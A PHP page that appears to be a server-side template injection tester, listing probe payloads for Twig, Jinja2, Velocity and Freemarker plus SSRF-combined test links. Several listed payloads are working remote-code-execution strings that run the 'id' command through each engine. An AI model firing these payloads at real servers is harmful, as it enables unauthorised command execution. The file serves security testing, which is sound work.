<?php
// ssti_tester.php - SSTI detection page
header("Content-Type: text/html; charset=utf-8");

// Common SSTI payloads for different template engines
$ssti_payloads = [
    'twig' => [
        '{{7*7}}' => '49',
        '{{7*\'7\'}}' => '49',
        '{{dump()}}' => 'Twig dump output',
        '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}' => 'uid output'
    ],
    'jinja2' => [
        '{{7*7}}' => '49',
        '{{7*\'7\'}}' => '7777777',
        '{{config}}' => 'Flask config',
        '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}' => 'uid output'
    ],
    'velocity' => [
        '#set($x=7*7)${x}' => '49',
        '${{7*7}}' => '49',
        '#set($str="")#set($x=$str.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))' => 'exec test'
    ],
    'freemarker' => [
        '${7*7}' => '49',
        '<#assign x=7*7>${x}' => '49',
        '${"freemarker.template.utility.Execute"?new()("id")}' => 'exec test'
    ]
];

// Check if test parameter is provided
if(isset($_GET['test'])) {
    $test_input = $_GET['test'];
    
    // Output raw input for testing
    echo "<h2>SSTI Test Results</h2>";
    echo "<p><strong>Input:</strong> " . htmlspecialchars($test_input) . "</p>";
    echo "<p><strong>Raw output:</strong> ";
    
    // Try to evaluate if in template context (this is simplified - real SSTI happens in template engines)
    if(strpos($test_input, '{{') !== false || strpos($test_input, '${') !== false) {
        echo "<span style='color:red'>Template syntax detected - but PHP doesn't evaluate it by default</span>";
    }
    echo "</p>";
    
    // Show what different engines would do
    echo "<h3>Expected results in different template engines:</h3>";
    foreach($ssti_payloads as $engine => $payloads) {
        if(array_key_exists($test_input, $payloads)) {
            echo "<p><strong>$engine:</strong> Would output: " . htmlspecialchars($payloads[$test_input]) . "</p>";
        }
    }
}

// Show test form
?>
<!DOCTYPE html>
<html>
<head>
    <title>SSTI Test Page</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .test-box { padding: 20px; background: #f5f5f5; border-radius: 5px; margin: 20px 0; }
        .payload { font-family: monospace; background: #333; color: #0f0; padding: 10px; }
        .danger { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <h1>SSTI (Server-Side Template Injection) Tester</h1>
    
    <div class="test-box">
        <h2>Test Common SSTI Payloads</h2>
        <form method="GET">
            <input type="text" name="test" style="width: 400px;" placeholder="Enter SSTI payload like {{7*7}}">
            <input type="submit" value="Test">
        </form>
        
        <h3>Quick Test Links:</h3>
        <ul>
            <li><a href="?test={{7*7}}">Test {{7*7}} (Twig/Jinja2)</a></li>
            <li><a href="?test=%24%7B7*7%7D">Test ${7*7} (Freemarker)</a></li>
            <li><a href="?test=%3C%25%3D7*7%25%3E">Test <%=7*7%> (ERB)</a></li>
            <li><a href="?test=%23set%28%24x%3D7*7%29%24%7Bx%7D">Test #set($x=7*7)${x} (Velocity)</a></li>
            <li><a href="?test=http://127.0.0.1:5000/logs%22%29%3B">Test your payload</a></li>
        </ul>
    </div>
    
    <div class="test-box">
        <h2>SSRF + SSTI Combined Test</h2>
        <p>If you suspect SSRF leading to internal SSTI:</p>
        <div class="payload">
            http://127.0.0.1:5000/logs?param={{7*7}}<br>
            http://127.0.0.1:5000/logs?param=${7*7}<br>
            http://127.0.0.1:5000/logs?param=<%=7*7%>
        </div>
        
        <h3>Your specific test link:</h3>
        <a href="?test=http://127.0.0.1:5000/logs%3C/p%3E%22%3B">Test: http://127.0.0.1:5000/logs&lt;/p&gt;&quot;;</a>
    </div>
    
    <div class="danger">
        <h2>⚠️ Security Warning</h2>
        <p>Only test on systems you own or have explicit permission to test.</p>
        <p>SSTI can lead to remote code execution (RCE).</p>
    </div>
    
    <h2>How to Use This Tester:</h2>
    <ol>
        <li>Enter template payloads in the form above</li>
        <li>Check if the template engine evaluates them</li>
        <li>If {{7*7}} outputs "49", you have SSTI!</li>
        <li>Test with more complex payloads based on the engine detected</li>
    </ol>
</body>
</html>
